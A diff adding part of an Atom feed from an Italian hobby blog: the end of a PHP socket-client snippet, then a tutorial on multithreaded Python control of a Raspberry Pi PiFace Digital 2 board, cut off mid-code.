+&lt;span class=&quot;nv&quot;&gt;$socket1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;socket_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Could not create socket&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;socket_connect&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$socket1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;socket_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$socket1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Could not write output&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;socket_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$socket1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#read 1 byte&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;socket_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$socket1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Giovanni De Costanzo</name></author><category term="Guides" /><category term="InternetofThings" /><category term="IoT" /><category term="piface" /><category term="piface digital 2" /><category term="pifaceio" /><category term="Programmazione" /><category term="Python" /><category term="raspberry" /><category term="raspberrypi" /><summary type="html"></summary></entry><entry><title type="html">PiFace Digital 2 - Applicazioni avanzate in Python</title><link href="http://localhost:4000/PiFace-Advanced-Apps" rel="alternate" type="text/html" title="PiFace Digital 2 - Applicazioni avanzate in Python" /><published>2016-08-23T00:00:00+02:00</published><updated>2016-08-23T00:00:00+02:00</updated><id>http://localhost:4000/PiFace-Advanced-Apps</id><content type="html" xml:base="http://localhost:4000/PiFace-Advanced-Apps">&lt;figure&gt;
+
+&lt;img data-width=&quot;1291&quot; data-height=&quot;479&quot; src=&quot;assets/posts/pifacedigital2.jpg&quot; /&gt;  
+&lt;/figure&gt;
+
+&lt;p&gt;In questo articolo vedremo come realizzare delle applicazioni più avanzate per il nostro PiFace Digital. In particolare vi mostrerò come creare un’applicazione multithread, ovvero come definire dei sottoprogrammi all’interno della nostra applicazione, che andranno a fare polling (si metteranno in ascolto) su diverse porte di input, eseguendo task differenti. Vedremo inoltre come condividere una variabile tra i thread in esecuzione e come gestire la pressione prolungata di un tasto.&lt;/p&gt;
+
+&lt;p&gt;Il programma di esempio che andremo a vedere, crea quattro thread che saranno lanciati parallelamente in esecuzione. I primi tre svolgono essenzialmente le stesse operazioni, ovvero aggiornano e poi stampano a video il valore della variabile condivisa che è stata creata. Il quarto thread invece, alla pressione prolungata per almeno 2 secondi, accende in sequenza tutti i led presenti sulla scheda PiFace. Di seguito è mostrato il codice che poi andremo a commentare. Suppongo che il lettore abbia già conoscenza del linguaggio Python, dunque eviterò di dare spiegazioni dettagliate per ciò che riguarda la sintassi e la logica del linguaggio.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;timeit&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_timer&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pifaceio&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;threading&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pifaceio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PiFace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#------ Shared variable -------
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;myVar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myVarSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stato&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;myVar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stato&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;#----- Pin read and write methods -----
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+   &lt;span class=&quot;n&quot;&gt;pfio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+&lt;span class=&quot;c1&quot;&gt;#------ Threads defining-------
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;myThread&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;
+ 
+   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'f1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'f2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;f2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'f3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ledShow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;ledShow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;f1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Previous state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;myVarSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Current state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Thread 1 terminated'&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;f2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Previous state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;myVarSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Current state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Thread 2 terminated'&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;f3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Previous state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;myVarSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Current state: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myVarValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Thread 3 terminated'&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt; 
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ledShow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;endsBefore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+         &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;endsBefore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+               &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
+
+         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endsBefore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;leds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;led&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;led&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;write_pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;led&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
